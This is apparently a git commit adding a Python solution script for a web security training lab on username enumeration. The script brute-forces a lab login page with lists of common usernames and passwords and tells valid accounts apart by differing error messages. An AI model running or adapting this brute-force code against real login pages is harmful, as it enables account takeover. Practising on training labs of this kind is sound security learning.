fdf1883effbe9ca5033d2dd0de3d52050e63f460
salkaev <salkaevi@xmail.ru>
2026-03-14 13:17:59 +0300

    Username enumeration via different response

---
+++ Username enumeration via different responses.py
@@ -0,0 +1,79 @@
+import random
+
+import requests
+import time
+from bs4 import BeautifulSoup
+import time
+from requests import session
+url = "https://0a8500cb0309f4c28121da8500bd0060.web-security-academy.net/login"
+
+password = [
+    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
+    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
+    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
+    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
+    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
+    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
+    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
+    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
+    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
+    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
+    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
+    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
+    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
+    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
+    "montana", "moon", "moscow"
+]
+local_pass = password
+name = [
+    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user",
+    "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user",
+    "vagrant", "azureuser", "academico", "acceso", "access", "accounting",
+    "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin",
+    "administracion", "administrador", "administrator", "administrators",
+    "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates",
+    "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai",
+    "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind",
+    "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce",
+    "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app",
+    "app01", "app1", "apple", "application", "applications", "apps",
+    "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona",
+    "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena",
+    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto",
+    "autodiscover"
+]
+
+import requests
+import time
+
+url = "https://0a8500cb0309f4c28121da8500bd0060.web-security-academy.net/login"
+local = ""
+for x in name:
+    print("USER:", x)
+    local_pass = password.copy()
+    i = 0
+    while i != len(local_pass):
+        local = local_pass[i]
+        data = {
+            "username": x,
+            "password": local_pass[i]
+        }
+
+        try:
+            r = requests.post(url, data=data, timeout=10)
+            print(f"{x}:{local_pass[i]}")
+            if r.status_code == 200 and "Invalid username" not in r.text:
+                if  "Incorrect password" not in r.text:
+                    print("FOUND:", x, local_pass[i])
+                    print(r.text)
+                    local_pass.remove(local_pass[i])
+                    exit()
+                else:
+                    local_pass.remove(local_pass[i])
+            else:
+                break
+
+        except requests.exceptions.RequestException as e:
+            local_pass.append(local)
+            print("ERROR:", e)
+            time.sleep(1)
